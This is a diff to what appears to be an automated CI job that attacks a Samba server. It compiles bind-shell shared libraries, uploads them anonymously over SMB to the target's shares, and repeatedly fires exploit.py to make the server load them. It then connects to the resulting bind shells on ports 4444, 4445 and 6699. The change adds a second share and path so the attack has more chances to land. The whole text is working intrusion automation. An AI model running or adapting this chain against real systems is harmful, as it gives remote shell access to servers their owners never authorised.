@@ -90,12 +90,15 @@ jobs:
           gcc -shared -fPIC -DBIND_PORT=4444 -o libspg4444.so bindshell-samba.c
           gcc -shared -fPIC -DBIND_PORT=4445 -o libspg4445.so bindshell-samba.c
           smbclient "//$TARGET/share" -N -c "put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls" || true
+          smbclient "//$TARGET/mnt" -N -c "put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls" || true
 
           for n in 1 2 3; do
-            echo "Trigger round $n /tmp/libspg4444.so"
-            python3 exploit.py -t "$TARGET" -m /tmp/libspg4444.so || true
-            echo "Trigger round $n /tmp/libspg4445.so"
-            python3 exploit.py -t "$TARGET" -m /tmp/libspg4445.so || true
+            for base in /tmp /mnt; do
+              echo "Trigger round $n $base/libspg4444.so"
+              python3 exploit.py -t "$TARGET" -m "$base/libspg4444.so" || true
+              echo "Trigger round $n $base/libspg4445.so"
+              python3 exploit.py -t "$TARGET" -m "$base/libspg4445.so" || true
+            done
             sleep 2
             for p in 4444 4445 6699; do
               echo "Connect bind shell $p"
